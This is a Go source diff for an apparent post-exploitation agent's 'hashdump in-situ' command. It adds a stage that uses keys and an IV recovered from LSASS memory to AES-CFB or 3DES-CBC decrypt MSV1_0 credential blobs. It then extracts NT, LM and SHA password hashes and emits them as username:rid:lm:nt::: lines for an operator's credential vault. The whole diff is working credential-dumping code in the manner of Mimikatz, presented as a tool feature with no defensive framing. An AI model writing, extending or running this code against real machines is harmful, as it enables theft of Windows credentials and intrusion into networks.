@@ -3,7 +3,7 @@
 
 package commands
 
-// Phase 2B + 2C-i + 2C-ii-a + 2C-ii-b (Step 1) orchestrator for hashdump
+// Phase 2B + 2C-i + 2C-ii-a + 2C-ii-b + 2C-ii-c orchestrator for hashdump
 // in-situ:
 //
 //   1. Run Phase 1 LSA enumeration to get an authoritative LUID → username
@@ -30,15 +30,19 @@ package commands
 //      LSASS-virtual addresses of the IV / h3DesKey / hAesKey globals. Walk
 //      the BCrypt handle → KIWI_BCRYPT_KEY81 → KIWI_HARD_KEY chain to extract
 //      the raw 24-byte 3DES + 32-byte AES key bytes plus the 16-byte IV.
-//   8. Emit a structured JSON report: one entry per walked node (with a
-//      nested credentials array), a summary header, and a top-level
-//      `lsa_crypto` block describing the captured key material.
-//
-// Phase 2C-ii-c will use the captured keys + IV to AES-CFB / 3DES-CBC decrypt
-// every ciphertext blob captured in step 6, parse the plaintext
-// KIWI_MSV1_0_PRIMARY_CREDENTIAL into NT/LM/SHA hashes, and add a
-// ProcessResponse hook that registers the extracted hashes via
-// registerCredentials.
+//   8. Phase 2C-ii-c: per captured ciphertext blob, AES-256-CFB or 3DES-CBC
+//      decrypt using the captured keys + IV, overlay the
+//      KIWI_MSV1_0_PRIMARY_CREDENTIAL_10_NEW layout, and surface the NT / LM /
+//      SHA hashes plus the four BOOLEAN validity flags. Emit a
+//      `username:rid:lm:nt:::` text block compatible with the existing
+//      `dump`-action ProcessResponse parser so the credential-vault
+//      registration hook handles MSV1_0-walk hashes the same way as SAM-dump
+//      hashes.
+//   9. Emit a structured JSON report: one entry per walked node (with a
+//      nested credentials array carrying decrypted hash blocks), a summary
+//      header, a top-level `lsa_crypto` block describing the captured key
+//      material, and a leading dump-compatible plaintext block containing
+//      one line per recovered MSV1_0 credential.
 
 import (
 	"encoding/hex"
@@ -88,42 +92,73 @@ type insituFullNodeReport struct {
 
 // insituFullCredentialReport is the JSON projection of a single
 // KIWI_MSV1_0_CREDENTIAL_LIST entry walked from a session's credentials_ptr
-// (Phase 2C-ii-a). The encrypted blob is captured as opaque bytes — Phase
-// 2C-ii-b will decrypt and parse it.
+// (Phase 2C-ii-a). The encrypted blob is captured as opaque bytes; Phase
+// 2C-ii-c populates the optional `decrypted` block when the captured key
+// material successfully decrypts and overlays the
+// KIWI_MSV1_0_PRIMARY_CREDENTIAL_10_NEW layout.
 type insituFullCredentialReport struct {
-	Address             string   `json:"address"`
-	AuthPackageId       uint32   `json:"auth_package_id"`
-	AuthPackage         string   `json:"auth_package"`
-	PrimaryCredsAddr    string   `json:"primary_credentials_address,omitempty"`
-	ParsedUserName      string   `json:"parsed_username,omitempty"`
-	ParsedDomain        string   `json:"parsed_domain,omitempty"`
-	EncryptedAddress    string   `json:"encrypted_address,omitempty"`
-	EncryptedLength     uint16   `json:"encrypted_length,omitempty"`
-	EncryptedHexPreview string   `json:"encrypted_hex_preview,omitempty"`
-	ParseErrors         []string `json:"parse_errors,omitempty"`
-	PrimaryReadErr      string   `json:"primary_read_err,omitempty"`
+	Address             string                       `json:"address"`
+	AuthPackageId       uint32                       `json:"auth_package_id"`
+	AuthPackage         string                       `json:"auth_package"`
+	PrimaryCredsAddr    string                       `json:"primary_credentials_address,omitempty"`
+	ParsedUserName      string                       `json:"parsed_username,omitempty"`
+	ParsedDomain        string                       `json:"parsed_domain,omitempty"`
+	EncryptedAddress    string                       `json:"encrypted_address,omitempty"`
+	EncryptedLength     uint16                       `json:"encrypted_length,omitempty"`
+	EncryptedHexPreview string                       `json:"encrypted_hex_preview,omitempty"`
+	ParseErrors         []string                     `json:"parse_errors,omitempty"`
+	PrimaryReadErr      string                       `json:"primary_read_err,omitempty"`
+	Decrypted           *insituFullDecryptedReport   `json:"decrypted,omitempty"`
+	DecryptErr          string                       `json:"decrypt_err,omitempty"`
+}
+
+// insituFullDecryptedReport is the JSON projection of a successfully
+// decrypted-and-parsed credential blob (Phase 2C-ii-c). NtHashHex is the
+// authoritative dump-vault input; LmHashHex / ShaHashHex are surfaced for
+// completeness and operator triage.
+type insituFullDecryptedReport struct {
+	Algorithm        string `json:"algorithm"`
+	PlaintextLength  int    `json:"plaintext_length"`
+	Layout           string `json:"layout"`
+	IsIso            bool   `json:"is_iso"`
+	IsNtOwfPassword  bool   `json:"is_nt_owf_password"`
+	IsLmOwfPassword  bool   `json:"is_lm_owf_password"`
+	IsShaOwPassword  bool   `json:"is_sha_owf_password"`
+	NtHashHex        string `json:"nt_hash_hex,omitempty"`
+	LmHashHex        string `json:"lm_hash_hex,omitempty"`
+	ShaHashHex       string `json:"sha_hash_hex,omitempty"`
+	DumpLine         string `json:"dump_line,omitempty"`
+	HeaderUserNameLength    uint16 `json:"header_username_length"`
+	HeaderUserNameMaxLen    uint16 `json:"header_username_max_length"`
+	HeaderLogonDomainLength uint16 `json:"header_logon_domain_length"`
+	HeaderLogonDomainMaxLen uint16 `json:"header_logon_domain_max_length"`
+	ParseErr                string `json:"parse_err,omitempty"`
 }
 
 // insituFullSummary captures the top-level metadata of a hashdump in-situ
 // full run (Phase 2B walk + Phase 2C-i structured parse + Phase 2C-ii-a
-// credential-list walk + Phase 2C-ii-b key extraction).
+// credential-list walk + Phase 2C-ii-b key extraction + Phase 2C-ii-c
+// decryption + plaintext NT/LM/SHA extraction).
 type insituFullSummary struct {
-	Phase1SessionCount      int                    `json:"phase1_session_count"`
-	LSASSPID                uint32                 `json:"lsass_pid"`
-	LsasrvBase              string                 `json:"lsasrv_base"`
-	LsasrvSize              uint32                 `json:"lsasrv_size"`
-	AnchorAddr              string                 `json:"logon_session_list_anchor"`
-	StructLayout            string                 `json:"struct_layout"`
-	CryptoLayout            string                 `json:"crypto_layout,omitempty"`
-	LsaCrypto               *insituFullCryptoReport `json:"lsa_crypto,omitempty"`
-	LsaCryptoErr            string                 `json:"lsa_crypto_err,omitempty"`
-	NodesWalked             int                    `json:"nodes_walked"`
-	NodesMatched            int                    `json:"nodes_matched_to_phase1"`
-	NodesStructParsed       int                    `json:"nodes_with_structured_luid"`
-	NodesWithCredentials    int                    `json:"nodes_with_credential_list"`
-	CredentialBlobsCaptured int                    `json:"credential_blobs_captured"`
-	UnmatchedLUIDs          []string               `json:"phase1_luids_not_seen_in_walk,omitempty"`
-	Nodes                   []insituFullNodeReport `json:"nodes"`
+	Phase1SessionCount       int                    `json:"phase1_session_count"`
+	LSASSPID                 uint32                 `json:"lsass_pid"`
+	LsasrvBase               string                 `json:"lsasrv_base"`
+	LsasrvSize               uint32                 `json:"lsasrv_size"`
+	AnchorAddr               string                 `json:"logon_session_list_anchor"`
+	StructLayout             string                 `json:"struct_layout"`
+	CryptoLayout             string                 `json:"crypto_layout,omitempty"`
+	PrimaryCredentialLayout  string                 `json:"primary_credential_layout,omitempty"`
+	LsaCrypto                *insituFullCryptoReport `json:"lsa_crypto,omitempty"`
+	LsaCryptoErr             string                 `json:"lsa_crypto_err,omitempty"`
+	NodesWalked              int                    `json:"nodes_walked"`
+	NodesMatched             int                    `json:"nodes_matched_to_phase1"`
+	NodesStructParsed        int                    `json:"nodes_with_structured_luid"`
+	NodesWithCredentials     int                    `json:"nodes_with_credential_list"`
+	CredentialBlobsCaptured  int                    `json:"credential_blobs_captured"`
+	CredentialBlobsDecrypted int                    `json:"credential_blobs_decrypted"`
+	HashesExtracted          int                    `json:"hashes_extracted"`
+	UnmatchedLUIDs           []string               `json:"phase1_luids_not_seen_in_walk,omitempty"`
+	Nodes                    []insituFullNodeReport `json:"nodes"`
 }
 
 // insituFullCryptoReport is the JSON projection of the Phase 2C-ii-b key
@@ -213,11 +248,20 @@ func executeInsituFull() structs.CommandResult {
 		return errorf("Phase 2B: %v", err)
 	}
 
-	// Step 5: Walk LogonSessionList. Partial walks are still useful — emit
+	// Step 5a: Phase 2C-ii-b key extraction — runs BEFORE the LogonSessionList
+	// walk so Phase 2C-ii-c can decrypt each ciphertext blob inline as the
+	// credential walk discovers it. Failures are non-fatal — the LogonSessionList
+	// walk and credential-list walk are independently useful even when key
+	// extraction fails on a build the signature isn't calibrated for.
+	reader := lsassRemoteReader{h: h}
+	cryptoLayout := LsaCryptoWin10W8
+	cryptoReport, cryptoMaterial, cryptoErrStr := captureLsaCrypto(reader, lsasrvBytes, mod.Base, cryptoLayout)
+	canDecrypt := cryptoMaterial.HasAESKey() || cryptoMaterial.HasDESKey()
+
+	// Step 5b: Walk LogonSessionList. Partial walks are still useful — emit
 	// what was collected even if a tail node fails. Read 0x180 bytes/node so
 	// the Phase 2C-i layout (LUID, UserName, Domain, Type, LogonType,
 	// LogonServer, Credentials) is captured in one ReadProcessMemory call.
-	reader := lsassRemoteReader{h: h}
 	layout := LayoutWin10W8
 	nodes, walkErr := walkLogonSessionList(reader, anchor, layout.NodeReadSize, 64)
 
@@ -231,6 +275,9 @@ func executeInsituFull() structs.CommandResult {
 	structParsed := 0
 	nodesWithCreds := 0
 	credBlobsCaptured := 0
+	credBlobsDecrypted := 0
+	hashesExtracted := 0
+	dumpLines := make([]string, 0, 8)
 	for _, n := range nodes {
 		preview := 32
 		if len(n.Raw) < preview {
@@ -330,6 +377,31 @@ func executeInsituFull() structs.CommandResult {
 							}
 							credReport.EncryptedHexPreview = hex.EncodeToString(c.Primary.EncryptedBytes[:previewLen])
 							credBlobsCaptured++
+
+							// Phase 2C-ii-c: decrypt + parse inline. Only MSV1_0
+							// credentials parse cleanly with the
+							// PRIMARY_CREDENTIAL_10_NEW layout — Kerberos / WDigest /
+							// CloudAP envelopes also use LsaProtectMemory but layer
+							// a different plaintext schema, so their decrypted
+							// blocks will populate but their NT/LM/SHA fields will
+							// often be all-zero (and therefore filtered out of the
+							// dump-line output). The JSON `decrypted` block is
+							// still attached so an operator can inspect raw
+							// plaintext bytes for layout-drift triage.
+							if canDecrypt {
+								dec, line := decryptCredentialBlob(cryptoMaterial, c.Primary.EncryptedBytes, c.Primary.UserName)
+								credReport.Decrypted = dec
+								if dec != nil && dec.ParseErr != "" {
+									credReport.DecryptErr = dec.ParseErr
+								}
+								if dec != nil && dec.NtHashHex != "" {
+									credBlobsDecrypted++
+									hashesExtracted++
+								}
+								if line != "" {
+									dumpLines = append(dumpLines, line)
+								}
+							}
 						}
 						credReport.ParseErrors = c.Primary.ParseErrors
 					}
@@ -348,33 +420,30 @@ func executeInsituFull() structs.CommandResult {
 		}
 	}
 
-	// Step 7: Phase 2C-ii-b key extraction. Sigscan
-	// LsaInitializeProtectedMemory_Internal in the same lsasrv.dll image,
-	// resolve the IV / h3DesKey / hAesKey RIP-relative globals, and walk the
-	// BCrypt key chain to recover the raw key material. Failures are
-	// non-fatal — the LogonSessionList walk and credential-list walk are
-	// independently useful even when key extraction fails on a build the
-	// signature isn't calibrated for.
-	cryptoLayout := LsaCryptoWin10W8
-	cryptoReport, cryptoErrStr := captureLsaCrypto(reader, lsasrvBytes, mod.Base, cryptoLayout)
+	// Step 7 (Phase 2C-ii-b key extraction) ran BEFORE the walk so step 6's
+	// credential loop could decrypt inline; the cryptoReport + cryptoMaterial
+	// are wired into the summary directly.
 
 	summary := insituFullSummary{
-		Phase1SessionCount:      len(phase1),
-		LSASSPID:                pid,
-		LsasrvBase:              fmt.Sprintf("0x%X", mod.Base),
-		LsasrvSize:              mod.Size,
-		AnchorAddr:              fmt.Sprintf("0x%X", anchor),
-		StructLayout:            layout.Name,
-		CryptoLayout:            cryptoLayout.Name,
-		LsaCrypto:               cryptoReport,
-		LsaCryptoErr:            cryptoErrStr,
-		NodesWalked:             len(nodes),
-		NodesMatched:            matchedNodes,
-		NodesStructParsed:       structParsed,
-		NodesWithCredentials:    nodesWithCreds,
-		CredentialBlobsCaptured: credBlobsCaptured,
-		UnmatchedLUIDs:          unmatched,
-		Nodes:                   reports,
+		Phase1SessionCount:       len(phase1),
+		LSASSPID:                 pid,
+		LsasrvBase:               fmt.Sprintf("0x%X", mod.Base),
+		LsasrvSize:               mod.Size,
+		AnchorAddr:               fmt.Sprintf("0x%X", anchor),
+		StructLayout:             layout.Name,
+		CryptoLayout:             cryptoLayout.Name,
+		PrimaryCredentialLayout:  PrimaryCredential10NewLayout.Name,
+		LsaCrypto:                cryptoReport,
+		LsaCryptoErr:             cryptoErrStr,
+		NodesWalked:              len(nodes),
+		NodesMatched:             matchedNodes,
+		NodesStructParsed:        structParsed,
+		NodesWithCredentials:     nodesWithCreds,
+		CredentialBlobsCaptured:  credBlobsCaptured,
+		CredentialBlobsDecrypted: credBlobsDecrypted,
+		HashesExtracted:          hashesExtracted,
+		UnmatchedLUIDs:           unmatched,
+		Nodes:                    reports,
 	}
 
 	jsonBytes, err := json.MarshalIndent(summary, "", "  ")
@@ -402,6 +471,22 @@ func executeInsituFull() structs.CommandResult {
 			cryptoReport.H3DesGlobal, bcryptCbSecret(cryptoReport.H3DesKey),
 			cryptoReport.HAesGlobal, bcryptCbSecret(cryptoReport.HAesKey)))
 	}
+	sb.WriteString(fmt.Sprintf("[+] Decryption: %d blob(s) yielded an MSV1_0 NT hash (%s layout) — Phase 2C-ii-c\n",
+		hashesExtracted, PrimaryCredential10NewLayout.Name))
+
+	// Dump-compatible text block: emit one `username:rid:lm:nt:::` line per
+	// recovered MSV1_0 credential. The existing hashdump ProcessResponse hook
+	// in agentfunctions/hashdump.go parses this exact format and registers
+	// each entry in the credential vault — Phase 2C-ii-c reuses the dump
+	// pipeline rather than introducing a parallel one.
+	if len(dumpLines) > 0 {
+		sb.WriteString("\n")
+		for _, line := range dumpLines {
+			sb.WriteString(line)
+			sb.WriteString("\n")
+		}
+	}
+
 	sb.WriteString("\n")
 	sb.WriteString(string(jsonBytes))
 	return successResult(sb.String())
@@ -416,6 +501,30 @@ func bcryptCbSecret(r *insituFullBcryptKeyReport) uint32 {
 	return r.CbSecret
 }
 
+// lsaCryptoMaterial bundles the raw bytes captured by Phase 2C-ii-b alongside
+// their JSON projection. The orchestrator passes the raw bytes into Phase
+// 2C-ii-c's decryptLsaProtectedMemory; the JSON projection is what goes into
+// the structured output.
+type lsaCryptoMaterial struct {
+	IV     []byte
+	AESKey []byte
+	DESKey []byte
+}
+
+// HasAESKey reports whether the AES key material is fully captured (32-byte
+// secret + 16-byte IV). Only when this is true can Phase 2C-ii-c decrypt the
+// modern AES-CFB ciphertext path.
+func (m lsaCryptoMaterial) HasAESKey() bool {
+	return len(m.AESKey) == lsaAESKeyLen && len(m.IV) >= lsaAESIVLen
+}
+
+// HasDESKey reports whether the 3DES key material is fully captured (24-byte
+// secret + 8-byte IV minimum). Only when this is true can Phase 2C-ii-c
+// decrypt the legacy 3DES-CBC ciphertext path.
+func (m lsaCryptoMaterial) HasDESKey() bool {
+	return len(m.DESKey) == lsaTDESKeyLen && len(m.IV) >= lsaTDESIVLen
+}
+
 // captureLsaCrypto runs the Phase 2C-ii-b key extraction:
 //
 //  1. Sigscan lsasrvBytes for LsaInitializeProtectedMemory_Internal.
@@ -424,14 +533,16 @@ func bcryptCbSecret(r *insituFullBcryptKeyReport) uint32 {
 //  3. ReadProcessMemory the IV bytes and walk the BCrypt key chain for both
 //     keys, capturing the raw key material.
 //
-// Any sigscan / read failure surfaces in the returned error string rather
-// than aborting the parent run — credential-blob inspection still works
-// without keys, and operators triaging layout drift want to see the partial
-// data.
-func captureLsaCrypto(r lsassReader, lsasrvBytes []byte, lsasrvBase uintptr, layout lsaCryptoLayout) (*insituFullCryptoReport, string) {
+// Returns the structured JSON projection AND a `lsaCryptoMaterial` carrying
+// the raw bytes Phase 2C-ii-c needs. Any sigscan / read failure surfaces in
+// the returned error string rather than aborting the parent run —
+// credential-blob inspection still works without keys, and operators
+// triaging layout drift want to see the partial data.
+func captureLsaCrypto(r lsassReader, lsasrvBytes []byte, lsasrvBase uintptr, layout lsaCryptoLayout) (*insituFullCryptoReport, lsaCryptoMaterial, string) {
+	var material lsaCryptoMaterial
 	globals, err := findLsaCryptoGlobals(lsasrvBytes, lsasrvBase, layout)
 	if err != nil {
-		return nil, err.Error()
+		return nil, material, err.Error()
 	}
 	report := &insituFullCryptoReport{
 		IVAddress:   fmt.Sprintf("0x%X", globals.IVAddr),
@@ -443,19 +554,69 @@ func captureLsaCrypto(r lsassReader, lsasrvBytes []byte, lsasrvBase uintptr, lay
 		report.IVErr = err.Error()
 	} else {
 		report.IVHex = hex.EncodeToString(iv)
+		material.IV = iv
 	}
 
 	if hk, k, err := readBcryptKeyMaterial(r, globals.H3DesKeyAddr); err != nil {
 		report.H3DesErr = err.Error()
 	} else {
 		report.H3DesKey = bcryptKeyReport(hk, k)
+		material.DESKey = append([]byte(nil), k.Key...)
 	}
 	if hk, k, err := readBcryptKeyMaterial(r, globals.HAesKeyAddr); err != nil {
 		report.HAesErr = err.Error()
 	} else {
 		report.HAesKey = bcryptKeyReport(hk, k)
+		material.AESKey = append([]byte(nil), k.Key...)
 	}
-	return report, ""
+	return report, material, ""
+}
+
+// decryptCredentialBlob runs Phase 2C-ii-c against a single captured
+// ciphertext blob. Returns a JSON-shaped report and (when the blob decrypts +
+// parses + carries an actionable NT hash) a `username:rid:lm:nt:::` text line
+// suitable for the existing dump-action ProcessResponse parser. The username
+// argument is the outer KIWI_MSV1_0_PRIMARY_CREDENTIAL_ENC envelope's
+// UserName captured by Phase 2C-ii-a; the inner LSA_UNICODE_STRING.Buffer
+// pointers in the decrypted plaintext point at LSASS-virtual memory and are
+// not re-dereferenced here (avoids a second remote read).
+func decryptCredentialBlob(material lsaCryptoMaterial, ciphertext []byte, outerUserName string) (*insituFullDecryptedReport, string) {
+	plaintext, alg, err := decryptLsaProtectedMemory(ciphertext, material.AESKey, material.DESKey, material.IV)
+	if err != nil {
+		report := &insituFullDecryptedReport{Algorithm: string(alg)}
+		report.ParseErr = err.Error()
+		return report, ""
+	}
+	parsed, perr := parsePrimaryCredential10New(plaintext)
+	report := &insituFullDecryptedReport{
+		Algorithm:               string(alg),
+		PlaintextLength:         len(plaintext),
+		Layout:                  parsed.Layout,
+		IsIso:                   parsed.IsIso,
+		IsNtOwfPassword:         parsed.IsNtOwfPassword,
+		IsLmOwfPassword:         parsed.IsLmOwfPassword,
+		IsShaOwPassword:         parsed.IsShaOwPassword,
+		HeaderUserNameLength:    parsed.UserNameHeaderLength,
+		HeaderUserNameMaxLen:    parsed.UserNameHeaderMaxLen,
+		HeaderLogonDomainLength: parsed.LogonDomainHeaderLength,
+		HeaderLogonDomainMaxLen: parsed.LogonDomainHeaderMaxLen,
+	}
+	if perr != nil {
+		report.ParseErr = perr.Error()
+		return report, ""
+	}
+	if !allZeroBytes(parsed.NtOwfPassword[:]) {
+		report.NtHashHex = hex.EncodeToString(parsed.NtOwfPassword[:])
+	}
+	if !allZeroBytes(parsed.LmOwfPassword[:]) {
+		report.LmHashHex = hex.EncodeToString(parsed.LmOwfPassword[:])
+	}
+	if !allZeroBytes(parsed.ShaOwPassword[:]) {
+		report.ShaHashHex = hex.EncodeToString(parsed.ShaOwPassword[:])
+	}
+	dumpLine := hashdumpDumpLine(outerUserName, parsed.NtOwfPassword, parsed.LmOwfPassword, parsed.IsLmOwfPassword)
+	report.DumpLine = dumpLine
+	return report, dumpLine
 }
 
 // bcryptKeyReport projects a (handle, key81) pair into JSON-shaped output.
